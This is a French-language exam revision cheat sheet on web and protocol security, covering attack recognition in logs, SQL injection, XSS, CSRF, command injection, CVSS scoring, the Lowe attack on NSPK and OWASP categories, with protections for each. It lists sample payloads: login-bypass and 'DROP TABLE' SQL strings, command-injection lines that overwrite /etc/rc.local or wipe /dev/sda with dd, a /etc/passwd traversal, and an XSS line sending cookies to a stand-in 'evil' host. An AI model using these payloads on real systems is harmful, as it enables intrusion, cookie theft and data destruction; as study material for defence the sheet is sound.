---
title: "Cheat Sheet -- Vulnerabilites et Securite informatique"
sidebar_position: 17
---

# Cheat Sheet -- Vulnerabilites et Securite informatique

> Fiche de revision rapide pour le DS (2h, documents autorises)
> Basee sur les cours de Olivier Heen et Barbara Fila + annales 2017, 2020, 2025

---

## 1. Identifier le type d'attaque dans un log

```
<script>, alert(, <img onerror, <SCRipt>         --> XSS
UNION, SELECT, OR 1=1, '--, ' OR '               --> SQL injection
;, |, ||, &&, `cmd`, $(cmd), /bin/, /etc/         --> CMD injection
URL d'action sur un param sans token/nonce        --> CSRF
../../, %2e%2e, /etc/passwd                       --> Path traversal / INFO
.bak, .old, admin.php, phpinfo                    --> INFO (reconnaissance)
```

| Log | Type |
|-----|------|
| `/search="<SCRipt>alert(42)</SCRipt>"` | XSS |
| `/stuff.php?id=42 UNION SELECT 1,1,null --` | SQL |
| `/test.php?traceroute="\|\| echo reboot > /etc/rc.local"` | CMD |
| `/dostuff.php?dir=; dd if=/dev/urandom of=/dev/sda` | CMD |
| `/login.php?user=Johnny' or 'b' = 'b` | SQL |
| `/set.php?WifiKey=ABC123` | CSRF |
| `/../../../../../../etc/passwd` | INFO |

---

## 2. Injection SQL

| Objectif | Payload |
|----------|---------|
| Contournement login (connu) | `admin'--` |
| Contournement login (inconnu) | `' OR 1=1--` |
| Sans commentaire | `' OR 'a'='a` |
| Champ numerique | `0 OR 1=1` |
| Extraction | `0' UNION SELECT col1,col2,... FROM table--` |
| Destruction | `'; DROP TABLE users--` |

**Protections** : 1. ORM 2. Requetes preparees 3. Echapper 4. Forcer type 5. Whitelist

**Phrase** : "Ne jamais faire confiance a une entree !"

---

## 3. XSS

| Type | Ou | Qui | Gravite |
|------|----|-----|---------|
| Reflete | URL/requete | 1 clic | Moyenne |
| Stocke | BDD | Tous | Haute |
| DOM | Client | Variable | Variable |

**Vol cookie** : `<img src=0 onerror="window.location='http://evil/c='+document.cookie">`

**Protections** : CSP > htmlspecialchars(ENT_QUOTES) > HttpOnly > SameSite

**Phrase** : "Ne jamais faire confiance a une sortie !"

---

## 4. CSRF

**Mecanisme** : victime authentifiee, l'attaquant forge une requete (GET/POST) automatique.

**Protections** : 1. SameSite=Strict 2. Token anti-CSRF

---

## 5. Injection de commandes

**Separateurs** : `;`  `|`  `||`  `&&`  `` `cmd` ``  `$(cmd)`  `\n`

**Protections** : 1. Eviter appels OS 2. Whitelist regex 3. Encoder

**Distinguer SQL vs CMD** : erreur SQL = "syntax error" / erreur CMD = "command not found"

---

## 6. CVSS

| Score | Niveau | | Metrique | Plus grave |
|-------|--------|---|----------|-----------|
| 0-3.9 | LOW | | AV | N(etwork) |
| 4.0-6.9 | MEDIUM | | AC | L(ow) |
| 7.0-8.9 | HIGH | | PR | N(one) |
| 9.0-10.0 | CRITICAL | | UI | N(one) |

```
Heartbleed : AV:N/AC:L/PR:N/UI:N = 7.5 HIGH
CSRF typique : AV:N/AC:L/PR:N/UI:R = MEDIUM
ShellShock : AV:N/AC:L/PR:N/UI:N = 9.8 CRITICAL
```

---

## 7. Triade CIA

| Propriete | Violation typique |
|-----------|------------------|
| **C** Confidentialite | Vol de donnees, lecture non autorisee |
| **I** Integrite | Modification de donnees, defacement |
| **D** Disponibilite | DDoS, crash, deni de service |

---

## 8. Notations cryptographiques

```
pk(i) = cle publique       sk(i) = cle privee
{m}pk(i) = chiffrement      {m}sk(i) = signature
k = cle symetrique          h(m) = hash          nonce n = nombre unique
```

**Regles cles** :
- pk(i) est PUBLIC : n'importe qui peut chiffrer pour i (emetteur PAS authentifie)
- {m}pk(i) = confidentialite / {m}sk(i) = authenticite+integrite
- Chiffrer =/= signer

---

## 9. NSPK vs NSPKL

| | NSPK (vulnerable) | NSPKL (corrige) |
|---|---|---|
| Msg 2 | `{(n, m)}pk(i)` | `{(n, m, r)}pk(i)` |
| MitM ? | OUI | NON |

**Attaque de Lowe** : Eve relaie entre Bob et Alice via deux sessions paralleles.

**Correction** : ajouter l'identite de r dans le message 2.

---

## 10. Authentification

```
Weak aliveness < Correct role < Agreement < Synchronization
```

| Attaque | Defense |
|---------|---------|
| Miroir | Signatures |
| Rejeu | Nonces frais |
| MitM | Identite dans les messages |

---

## 11. Mots de passe

- Stockage : hash sale (bcrypt/Argon2), JAMAIS en clair
- Top 1 : `123456` (37M)
- 72% crackables en 10^12 essais
- Outils : hashcat, John the Ripper

---

## 12. Securite Cloud

- **IaaS/PaaS/SaaS** : responsabilites differentes
- **Multitenancy** : canaux auxiliaires (cache, deduplication)
- **Images** : toujours mettre a jour
- **Interface web** : risques XSS, preferer l'API
- **IAM** : droits minimaux

---

## 13. Definitions cles

| Terme | Definition |
|-------|-----------|
| **Kerckhoffs** | Securite = secret de la cle, pas de l'algorithme |
| **Dolev-Yao** | Attaquant ACTIF, crypto parfaite, controle total du reseau |
| **Defense en profondeur** | Plusieurs couches de protection |
| **Moindre privilege** | Uniquement les droits necessaires |

---

## 14. OWASP Top 10 (2021)

```
A01 Controle d'acces defaillant      A06 Composants vulnerables
A02 Defaillances cryptographiques    A07 Defaillances d'authentification
A03 Injection                        A08 Defaillances d'integrite
A04 Conception non securisee         A09 Defaillances de journalisation
A05 Mauvaise configuration           A10 SSRF
```

---

## 15. Checklist avant de rendre sa copie

- [ ] Identification d'attaque : UN SEUL type par ligne
- [ ] SQL : champ string (apostrophe) ou numerique (pas d'apostrophe) ?
- [ ] CVSS : vecteur d'attaque (AV) + interaction utilisateur (UI)
- [ ] Protocoles : MSC complet avec connaissances initiales
- [ ] Proprietes de securite : preciser le ROLE (i ou r)
- [ ] MitM : montrer les DEUX sessions paralleles
- [ ] Justifier chaque reponse
